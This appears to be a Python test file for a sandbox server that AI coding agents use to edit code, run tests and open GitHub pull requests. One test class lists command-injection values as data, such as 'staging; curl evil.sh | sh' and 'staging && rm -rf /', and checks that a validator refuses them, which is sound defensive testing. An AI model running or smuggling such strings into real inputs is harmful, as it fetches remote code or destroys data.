    def test_tool_call_uses_the_work_item_id_for_its_branch(self):
        payload = {
            "action": "list_files", "target_app": "one_bpmn", "git_branch": "staging",
            "work_item_description": "Fix the thing.", "work_item_id": "WI-002322",
            "args": {}, "github_token": "gh-token",
        }
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(False, "stop here")) as checkout:
            srv._handle_tool_call(payload)
        checkout.assert_called_once_with("one_bpmn", "staging", "WI-002322")

    def test_open_pull_request_passes_the_work_item_id_to_open_pr(self):
        run_ctx = {
            "git_branch": "staging", "work_item_description": "Fix it.", "work_item_id": "WI-002322",
            "github_token": "gh-token", "correlation_id": "corr-1",
        }
        with patch.object(srv, "_collect_changed_files", return_value={"a.py": "x"}), patch.object(
            srv, "_run_tests", return_value=(True, "", "", [])
        ), patch.object(srv, "_open_pr", return_value=("https://github.com/x/y/pull/1", None)) as open_pr:
            srv._tool_open_pull_request("one_bpmn", {"summary": "did it"}, run_ctx)
        self.assertEqual(open_pr.call_args.kwargs["work_item_id"], "WI-002322")

    def test_open_pr_puts_the_work_item_id_on_branch_title_and_body(self):
        sent = []

        def fake_request(method, url, token, ok=(200,), json_body=None):
            sent.append((method, url, json_body))
            if method == "GET" and "/git/ref/heads/" in url:
                return {"object": {"sha": "base-sha"}}
            if method == "POST" and url.endswith("/pulls"):
                return {"html_url": "https://github.com/ONE-F-M/one_bpmn/pull/9", "number": 9}
            return {}

        with patch.object(srv, "_repo_for_local_clone", return_value="ONE-F-M/one_bpmn"), patch.object(
            srv, "_github_request", side_effect=fake_request
        ):
            pr_url, err = srv._open_pr(
                "one_bpmn", "staging", "Fix the thing.", {"a.py": "x"}, "gh-token", "corr-1", "changed a.py",
                work_item_id="WI-002322",
            )
        self.assertIsNone(err)
        self.assertEqual(pr_url, "https://github.com/ONE-F-M/one_bpmn/pull/9")
        ref = next(b for m, u, b in sent if m == "POST" and u.endswith("/git/refs"))
        self.assertEqual(ref["ref"], "refs/heads/WI-002322")
        pr = next(b for m, u, b in sent if m == "POST" and u.endswith("/pulls"))
        self.assertEqual(pr["head"], "WI-002322")
        self.assertTrue(pr["title"].startswith("WI-002322: "))
        self.assertIn("Work Item: **WI-002322**", pr["body"])

    def test_without_a_work_item_id_nothing_changes(self):
        """The hashed branch and the old title survive for callers that send no id."""
        sent = []

        def fake_request(method, url, token, ok=(200,), json_body=None):
            sent.append((method, url, json_body))
            if method == "GET" and "/git/ref/heads/" in url:
                return {"object": {"sha": "base-sha"}}
            if method == "POST" and url.endswith("/pulls"):
                return {"html_url": "https://github.com/ONE-F-M/one_bpmn/pull/9", "number": 9}
            return {}

        with patch.object(srv, "_repo_for_local_clone", return_value="ONE-F-M/one_bpmn"), patch.object(
            srv, "_github_request", side_effect=fake_request
        ):
            srv._open_pr("one_bpmn", "staging", "Fix the thing.", {"a.py": "x"}, "gh-token", "corr-1", "r")
        pr = next(b for m, u, b in sent if m == "POST" and u.endswith("/pulls"))
        self.assertEqual(pr["head"], srv._head_branch_for("one_bpmn", "staging", "Fix the thing."))
        self.assertTrue(pr["title"].startswith("Dev Agent: "))
        self.assertNotIn("Work Item:", pr["body"])

class TestHungCommandsReadAsFailures(unittest.TestCase):
    def test_run_turns_a_timeout_into_a_failed_result(self):
        boom = srv.subprocess.TimeoutExpired(cmd="yarn build", timeout=900, output=b"partial out", stderr=b"")
        with patch.object(srv.subprocess, "run", side_effect=boom):
            result = srv._run("cd /x && yarn build", timeout=900)
        self.assertEqual(result.returncode, 124)
        self.assertIn("partial out", result.stdout)
        self.assertIn("timed out after 900s", result.stderr)
        self.assertIn("yarn build", result.stderr)

    def test_mobile_tests_report_a_hung_build_instead_of_raising(self):
        hung = srv.subprocess.CompletedProcess("yarn build", 124, "", "timed out after 900s: yarn build")
        with patch.object(srv, "_run", return_value=hung) as run:
            passed, stdout, stderr, failing_tests = srv._run_tests("mobile_app_ionic")
        self.assertFalse(passed)
        self.assertEqual(failing_tests, [])
        self.assertIn("timed out after 900s", stderr)
        run.assert_called_once()  # a hung build never reaches the unit tests

    def test_an_escaping_exception_still_marks_the_job_failed_and_calls_back(self):
        payload = {"correlation_id": "corr-9", "callback_url": "https://processa.example.com/cb"}

        def job(_payload):
            raise RuntimeError("something nobody anticipated")

        with patch.object(srv, "_set_status") as set_status, patch.object(srv, "_post_callback") as post:
            srv._report_unexpected_failure(job, payload)
        set_status.assert_called_once()
        self.assertEqual(set_status.call_args.kwargs["state"], "failed")
        self.assertIn("RuntimeError", set_status.call_args.kwargs["error"])
        post.assert_called_once()
        url, body = post.call_args.args
        self.assertEqual(url, "https://processa.example.com/cb")
        self.assertEqual(body["correlation_id"], "corr-9")
        self.assertEqual(body["status"], "failed")
        self.assertIn("something nobody anticipated", body["error"])

    def test_a_job_that_finishes_normally_reports_nothing_extra(self):
        with patch.object(srv, "_set_status") as set_status, patch.object(srv, "_post_callback") as post:
            srv._report_unexpected_failure(lambda p: None, {"correlation_id": "corr-9"})
        set_status.assert_not_called()
        post.assert_not_called()

class TestCollectChangedFilesSeesCommittedEdits(unittest.TestCase):
    """The fast tools commit every edit as it happens, so by the time
    open_pull_request looks, `git diff HEAD` is empty — the change lives in
    the branch's own commits."""

    def setUp(self):
        self.bench_dir = os.path.realpath(tempfile.mkdtemp())
        self.app_dir = os.path.join(self.bench_dir, "apps", "one_bpmn")
        os.makedirs(os.path.join(self.app_dir, "spiff"))
        for name in ("committed.vue", "pending.py", "both.js"):
            with open(os.path.join(self.app_dir, "spiff", name), "w") as fh:
                fh.write(f"content of {name}")
        self.bench_dir_patch = patch.object(srv, "BENCH_DIR", self.bench_dir)
        self.bench_dir_patch.start()

    def tearDown(self):
        self.bench_dir_patch.stop()
        shutil.rmtree(self.bench_dir, ignore_errors=True)

    @staticmethod
    def _fake_run(cmd, **kwargs):
        if "git diff --name-only staging...HEAD" in cmd:
            return _FakeCompletedProcess(0, "spiff/committed.vue\nspiff/both.js\n", "")
        if "git diff --name-only HEAD" in cmd:
            return _FakeCompletedProcess(0, "spiff/pending.py\nspiff/both.js\n", "")
        raise AssertionError(cmd)

    def test_committed_and_pending_changes_are_both_collected_once(self):
        with patch.object(srv, "_run", side_effect=self._fake_run):
            files = srv._collect_changed_files("one_bpmn", "staging")
        self.assertEqual(sorted(files), ["spiff/both.js", "spiff/committed.vue", "spiff/pending.py"])
        self.assertEqual(files["spiff/committed.vue"], "content of committed.vue")

    def test_without_a_base_branch_only_pending_changes_are_collected(self):
        with patch.object(srv, "_run", side_effect=self._fake_run):
            files = srv._collect_changed_files("one_bpmn")
        self.assertEqual(sorted(files), ["spiff/both.js", "spiff/pending.py"])

    def test_open_pull_request_diffs_against_the_run_base_branch(self):
        run_ctx = {"git_branch": "staging", "work_item_description": "Fix it.",
                   "github_token": "gh-token", "correlation_id": "corr-1"}
        with patch.object(srv, "_collect_changed_files", return_value={}) as collect, patch.object(
            srv, "_run_tests"
        ), patch.object(srv, "_open_pr"):
            srv._tool_open_pull_request("one_bpmn", {"summary": "s"}, run_ctx)
        collect.assert_called_once_with("one_bpmn", "staging")


class TestShellIdentifiersAreValidated(unittest.TestCase):
    """target_app and git_branch reach `subprocess.run(..., shell=True)`, so a
    value carrying shell metacharacters must be refused before anything runs."""

    def _tool_call(self, **over):
        payload = {"action": "list_files", "target_app": "one_bpmn", "git_branch": "staging",
                   "work_item_description": "Fix it.", "github_token": "gh-token"}
        payload.update(over)
        return payload

    def test_a_clean_payload_still_passes(self):
        self.assertIsNone(srv._validate_tool_call_payload(self._tool_call()))
        self.assertIsNone(srv._validate_payload(_valid_payload()))

    def test_command_injection_in_git_branch_is_refused(self):
        for evil in ("staging; curl evil.sh | sh", "staging && rm -rf /", "staging`id`",
                     "staging$(id)", "staging | tee /tmp/x", "-staging", "a..b", "staging/"):
            error = srv._validate_tool_call_payload(self._tool_call(git_branch=evil))
            self.assertIsNotNone(error, f"accepted {evil!r}")
            self.assertIn("git_branch", error)

    def test_command_injection_in_target_app_is_refused(self):
        for evil in ("one_bpmn; id", "../../etc", "one bpmn", "one_bpmn$(id)", ""):
            error = srv._validate_tool_call_payload(self._tool_call(target_app=evil))
            self.assertIsNotNone(error, f"accepted {evil!r}")

    def test_the_run_endpoint_is_guarded_too(self):
        error = srv._validate_payload(_valid_payload(git_branch="staging; id"))
        self.assertIn("git_branch", error)
        error = srv._validate_payload({**_valid_payload(), "action": "run_tests",
                                       "target_app": "one_bpmn; id"})
        self.assertIn("target_app", error)

    def test_real_branch_shapes_are_still_accepted(self):
        for good in ("staging", "version-15", "WI-002322", "feature/thing_1.2", "dev-agent/7ecdc32674ea3c20"):
            self.assertIsNone(srv._validate_tool_call_payload(self._tool_call(git_branch=good)), good)

    def test_every_shell_interpolation_is_quoted(self):
        """Defence in depth behind the validator: no _run() f-string may drop a
        bare {value} into the command line."""
        import inspect, re as _re
        source = inspect.getsource(srv)
        bare = [l.strip() for l in source.splitlines()
                if "_run(f" in l and _re.search(r"\{(?!shlex\.quote)[a-z_]+\}", l)]
        self.assertEqual(bare, [])


class TestCheckoutTakesWhatWasJustFetched(unittest.TestCase):
    """The base branch must be origin's current tip, not the one baked into the
    image, and an existing head branch must be reachable on any instance."""

    @staticmethod
    def _fake(exists_remotely):
        def fake_run(cmd, **kwargs):
            if "git remote get-url origin" in cmd:
                return _FakeCompletedProcess(0, stdout="https://github.com/o/r.git\n")
            if "git fetch origin WI-003239" in cmd:
                return _FakeCompletedProcess(0 if exists_remotely else 1, stderr="" if exists_remotely else "couldn't find remote ref")
            return _FakeCompletedProcess(0)
        return fake_run

    def test_new_head_branch_starts_from_the_fetched_base_not_the_local_one(self):
        calls = []
        def fake(cmd, **kw):
            calls.append(cmd); return self._fake(False)(cmd, **kw)
        with patch.object(srv, "_run", side_effect=fake):
            ok, err = srv._checkout_or_create_head_branch("one_bpmn", "staging", "WI-003239")
        self.assertTrue(ok, err)
        fetch = next(i for i, c in enumerate(calls) if "git fetch origin staging" in c)
        base = next(i for i, c in enumerate(calls) if "git checkout -f -B staging FETCH_HEAD" in c)
        head = next(i for i, c in enumerate(calls) if "git checkout -B WI-003239" in c and "FETCH_HEAD" not in c)
        self.assertLess(fetch, base); self.assertLess(base, head)
        self.assertFalse(any("origin/staging" in c for c in calls))

    def test_existing_head_branch_is_checked_out_from_fetch_head_on_any_instance(self):
        calls = []
        def fake(cmd, **kw):
            calls.append(cmd); return self._fake(True)(cmd, **kw)
        with patch.object(srv, "_run", side_effect=fake):
            ok, err = srv._checkout_or_create_head_branch("one_bpmn", "staging", "WI-003239")
        self.assertTrue(ok, err)
        self.assertTrue(any("git checkout -f -B WI-003239 FETCH_HEAD" in c for c in calls))
        self.assertFalse(any("origin/WI-003239" in c for c in calls))
        self.assertFalse(any("git push" in c for c in calls))

    def test_bundled_path_also_resets_the_base_to_the_fetched_tip(self):
        calls = []
        def fake(cmd, **kw):
            calls.append(cmd)
            if "git remote get-url origin" in cmd:
                return _FakeCompletedProcess(0, stdout="https://github.com/o/r.git\n")
            return _FakeCompletedProcess(0)
        with patch.object(srv, "_run", side_effect=fake):
            ok, err = srv._checkout_target_branch("one_bpmn", "staging")
        self.assertTrue(ok, err)
        self.assertTrue(any("git checkout -f -B staging FETCH_HEAD" in c for c in calls))


class TestCheckoutForcesPastBakeTimeDrift(unittest.TestCase):
    """Confirmed live (2026-09-07): a work order failed with "git checkout of
    base branch staging failed: ... Your local changes to the following
    files would be overwritten by checkout: one_fm/patches.txt" — a tracked
    file already differed from FETCH_HEAD before the Dev Agent's own
    checkout ever ran, because the app dirs are cloned once at image bake
    time, not fresh per run. A plain `git checkout -B ... FETCH_HEAD`
    refuses rather than switch; nothing on that disk between calls is meant
    to survive (the pushed branch is the only durable state), so every
    FETCH_HEAD checkout must force past this instead of failing the run."""

    def test_every_fetch_head_checkout_site_forces_past_a_dirty_tree(self):
        for fn, args in (
            (srv._checkout_target_branch, ("one_bpmn", "staging")),
            (srv._checkout_or_create_head_branch, ("one_bpmn", "staging", "WI-003239")),
        ):
            calls = []
            def fake(cmd, **kw):
                calls.append(cmd)
                if "git remote get-url origin" in cmd:
                    return _FakeCompletedProcess(0, stdout="https://github.com/o/r.git\n")
                if "git fetch origin WI-003239" in cmd:
                    return _FakeCompletedProcess(1, stderr="couldn't find remote ref")
                return _FakeCompletedProcess(0)
            with patch.object(srv, "_run", side_effect=fake):
                ok, err = fn(*args)
            self.assertTrue(ok, err)
            fetch_head_checkouts = [c for c in calls if "FETCH_HEAD" in c and "git checkout" in c]
            self.assertTrue(fetch_head_checkouts, f"no FETCH_HEAD checkout issued for {fn.__name__}")
            for c in fetch_head_checkouts:
                self.assertIn("git checkout -f -B", c, f"{fn.__name__} checked out without -f: {c!r}")


class TestGitIdentityFor(unittest.TestCase):
    """_commit_and_push used to hardcode 'Dev Agent' <dev-agent@sandbox> on
    every commit regardless of which Processa agent actually called the
    sandbox -- e.g. Bug Agent's own fixes showed up authored as Dev Agent.
    _git_identity_for derives the identity from the caller instead."""

    def test_slugifies_the_name_into_an_email(self):
        name, email = srv._git_identity_for("Bug Agent")
        self.assertEqual(name, "Bug Agent")
        self.assertEqual(email, "bug-agent@sandbox")

    def test_none_falls_back_to_dev_agent(self):
        name, email = srv._git_identity_for(None)
        self.assertEqual(name, "Dev Agent")
        self.assertEqual(email, "dev-agent@sandbox")

    def test_blank_falls_back_to_dev_agent(self):
        name, email = srv._git_identity_for("   ")
        self.assertEqual(name, "Dev Agent")
        self.assertEqual(email, "dev-agent@sandbox")

    def test_punctuation_and_spacing_collapse_to_single_hyphens(self):
        name, email = srv._git_identity_for("  Mobile App Agent!! ")
        self.assertEqual(name, "Mobile App Agent!!")
        self.assertEqual(email, "mobile-app-agent@sandbox")


class TestAgentNameThreading(unittest.TestCase):
    """Mirrors TestWorkItemIdThreading: agent_name is optional on the
    payload (every existing caller that never sends it must behave exactly
    as before -- still 'Dev Agent' everywhere), but when a specialist other
    than Dev Agent sends its own name, that name reaches the actual git
    commit author and the PR-title fallback, not a fixed literal."""

    def setUp(self):
        self.bench_dir = os.path.realpath(tempfile.mkdtemp())
        self.app_dir = os.path.join(self.bench_dir, "apps", "one_bpmn")
        os.makedirs(self.app_dir)
        self.bench_dir_patch = patch.object(srv, "BENCH_DIR", self.bench_dir)
        self.bench_dir_patch.start()

    def tearDown(self):
        self.bench_dir_patch.stop()
        shutil.rmtree(self.bench_dir, ignore_errors=True)

    def _payload(self, action, args, agent_name=None):
        payload = {
            "action": action, "target_app": "one_bpmn", "git_branch": "staging",
            "work_item_description": "Fix the thing.", "args": args, "github_token": "gh-token",
        }
        if agent_name is not None:
            payload["agent_name"] = agent_name
        return payload

    def test_write_file_commit_uses_the_calling_agents_identity(self):
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)), patch.object(
            srv, "_commit_and_push", return_value=(True, None)
        ) as mock_commit:
            srv._handle_tool_call(
                self._payload("write_file", {"path": "a.py", "content": "x"}, agent_name="Bug Agent")
            )
        args, kwargs = mock_commit.call_args
        self.assertEqual(args[3], "write_file via Bug Agent")
        self.assertEqual(args[4], "Bug Agent")

    def test_edit_file_commit_uses_the_calling_agents_identity(self):
        with open(os.path.join(self.app_dir, "a.py"), "w") as fh:
            fh.write("x")
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)), patch.object(
            srv, "_commit_and_push", return_value=(True, None)
        ) as mock_commit:
            srv._handle_tool_call(
                self._payload("edit_file", {"path": "a.py", "old_string": "x", "new_string": "y"}, agent_name="Bug Agent")
            )
        args, kwargs = mock_commit.call_args
        self.assertEqual(args[3], "edit_file via Bug Agent")
        self.assertEqual(args[4], "Bug Agent")

    def test_no_agent_name_on_payload_still_reads_as_dev_agent(self):
        """Every caller that predates this field (or never sends it) must
        see exactly the old behaviour -- no regression for Dev Agent."""
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)), patch.object(
            srv, "_commit_and_push", return_value=(True, None)
        ) as mock_commit:
            srv._handle_tool_call(self._payload("write_file", {"path": "a.py", "content": "x"}))
        args, kwargs = mock_commit.call_args
        self.assertEqual(args[3], "write_file via Dev Agent")
        self.assertEqual(args[4], "Dev Agent")

    def test_commit_and_push_actually_sets_the_git_author(self):
        commands = []

        def fake_run(cmd, **kwargs):
            commands.append(cmd)
            return _FakeCompletedProcess(0)

        with patch.object(srv, "_run", side_effect=fake_run), patch.object(srv, "_authed_remote"):
            srv._commit_and_push("one_bpmn", "wi-branch", "a.py", "write_file via Bug Agent", "Bug Agent")
        commit_cmd = next(c for c in commands if "commit -q -m" in c)
        self.assertIn("user.email=bug-agent@sandbox", commit_cmd)
        self.assertIn("user.name='Bug Agent'", commit_cmd)

    def test_open_pull_request_passes_agent_name_through_to_open_pr(self):
        run_ctx = {
            "git_branch": "staging", "work_item_description": "Fix it.",
            "github_token": "gh-token", "correlation_id": "corr-1", "agent_name": "Bug Agent",
        }
        with patch.object(srv, "_collect_changed_files", return_value={"a.py": "x"}), patch.object(
            srv, "_run_tests", return_value=(True, "", "", [])
        ), patch.object(srv, "_open_pr", return_value=("https://github.com/x/y/pull/1", None)) as open_pr:
            srv._tool_open_pull_request("one_bpmn", {"summary": "did it"}, run_ctx)
        self.assertEqual(open_pr.call_args.kwargs["agent_name"], "Bug Agent")

    def test_open_pr_title_fallback_uses_agent_name_without_a_work_item_id(self):
        sent = []

        def fake_request(method, url, token, ok=(200,), json_body=None):
            sent.append((method, url, json_body))
            if method == "GET" and "/git/ref/heads/" in url:
                return {"object": {"sha": "base-sha"}}
            if method == "POST" and url.endswith("/pulls"):
                return {"html_url": "https://github.com/ONE-F-M/one_bpmn/pull/9", "number": 9}
            return {}

        with patch.object(srv, "_repo_for_local_clone", return_value="ONE-F-M/one_bpmn"), patch.object(
            srv, "_github_request", side_effect=fake_request
        ):
            srv._open_pr(
                "one_bpmn", "staging", "Fix the thing.", {"a.py": "x"}, "gh-token", "corr-1", "r",
                agent_name="Bug Agent",
            )
        pr = next(b for m, u, b in sent if m == "POST" and u.endswith("/pulls"))
        self.assertTrue(pr["title"].startswith("Bug Agent: "))

    def test_open_pr_title_fallback_defaults_to_dev_agent_when_not_given(self):
        sent = []

        def fake_request(method, url, token, ok=(200,), json_body=None):
            sent.append((method, url, json_body))
            if method == "GET" and "/git/ref/heads/" in url:
                return {"object": {"sha": "base-sha"}}
            if method == "POST" and url.endswith("/pulls"):
                return {"html_url": "https://github.com/ONE-F-M/one_bpmn/pull/9", "number": 9}
            return {}

        with patch.object(srv, "_repo_for_local_clone", return_value="ONE-F-M/one_bpmn"), patch.object(
            srv, "_github_request", side_effect=fake_request
        ):
            srv._open_pr("one_bpmn", "staging", "Fix the thing.", {"a.py": "x"}, "gh-token", "corr-1", "r")
        pr = next(b for m, u, b in sent if m == "POST" and u.endswith("/pulls"))
        self.assertTrue(pr["title"].startswith("Dev Agent: "))


class TestExtractFailingTests(unittest.TestCase):
    """_extract_failing_tests reads the "FAIL: <id>" / "ERROR: <id>" summary
    lines Python's own unittest.TextTestRunner prints (what `bench
    run-tests` uses under the hood) -- an agent resuming after a sandbox
    failure used to get only a raw output tail, with no way to tell which
    tests actually broke without re-reading the whole thing itself."""

    def test_finds_fail_and_error_lines(self):
        text = (
            "======================================================================\n"
            "FAIL: test_something (one_bpmn.tests.test_x.TestX)\n"
            "----------------------------------------------------------------------\n"
            "Traceback (most recent call last):\n"
            "AssertionError: 1 != 2\n"
            "\n"
            "======================================================================\n"
            "ERROR: test_other (one_bpmn.tests.test_y.TestY)\n"
            "----------------------------------------------------------------------\n"
            "ValueError: boom\n"
        )
        self.assertEqual(
            srv._extract_failing_tests(text),
            ["test_something (one_bpmn.tests.test_x.TestX)", "test_other (one_bpmn.tests.test_y.TestY)"],
        )

    def test_no_failures_returns_empty_list(self):
        self.assertEqual(srv._extract_failing_tests("Ran 12 tests in 3.4s\n\nOK\n"), [])

    def test_searches_every_text_given_and_dedupes(self):
        stdout = "FAIL: test_a (mod.TestA)\n"
        stderr = "FAIL: test_a (mod.TestA)\nERROR: test_b (mod.TestB)\n"
        self.assertEqual(
            srv._extract_failing_tests(stdout, stderr),
            ["test_a (mod.TestA)", "test_b (mod.TestB)"],
        )

    def test_none_text_is_ignored_not_an_error(self):
        self.assertEqual(srv._extract_failing_tests(None, "FAIL: test_a (mod.TestA)\n"), ["test_a (mod.TestA)"])

    def test_stops_at_the_limit(self):
        text = "\n".join(f"FAIL: test_{i} (mod.TestCase)" for i in range(10))
        self.assertEqual(len(srv._extract_failing_tests(text, limit=3)), 3)


class TestRunTestsReturnsFailingTests(unittest.TestCase):
    """_run_tests' new 4th return value, and _tool_run_tests surfacing it —
    the piece agent_callback.py needs to store failing test names on Agent
    Sandbox Run and hand them back to the agent, instead of just a raw,
    truncated output tail it has to re-parse itself."""

    def test_run_tests_extracts_failing_tests_from_bench_output(self):
        result = srv.subprocess.CompletedProcess(
            "bench run-tests", 1, "FAIL: test_thing (mod.TestThing)\n", "",
        )
        with patch.object(srv, "_run", return_value=result):
            passed, stdout, stderr, failing_tests = srv._run_tests("one_bpmn")
        self.assertFalse(passed)
        self.assertEqual(failing_tests, ["test_thing (mod.TestThing)"])

    def test_tool_run_tests_includes_failing_tests_in_its_result(self):
        with patch.object(
            srv, "_run_tests", return_value=(False, "out", "err", ["test_thing (mod.TestThing)"])
        ):
            result = srv._tool_run_tests("one_bpmn", {})
        self.assertEqual(result["failing_tests"], ["test_thing (mod.TestThing)"])

    def test_tool_run_tests_empty_failing_tests_on_a_pass(self):
        with patch.object(srv, "_run_tests", return_value=(True, "out", "err", [])):
            result = srv._tool_run_tests("one_bpmn", {})
        self.assertEqual(result["failing_tests"], [])
